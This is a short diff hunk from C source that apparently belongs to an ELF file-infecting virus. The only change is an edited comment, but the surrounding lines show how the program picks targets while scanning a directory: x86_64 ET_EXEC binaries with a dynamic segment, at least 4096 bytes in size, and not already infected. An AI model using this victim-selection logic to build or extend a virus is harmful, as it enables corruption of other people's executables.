@@ -822,7 +822,7 @@ rescan:
 			// PER: all in the heap section of the process memory that is called by the full_path function.
 			
 			// PER: checking criteria
-			// 1. atleast one dynamic segment(dynamically linked)
+			// 1. atleast one dynamic segment
 			// 2. should be an x86_64 ET_EXEC elf file not already infected
 			// 3. size>=4096 bytes
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
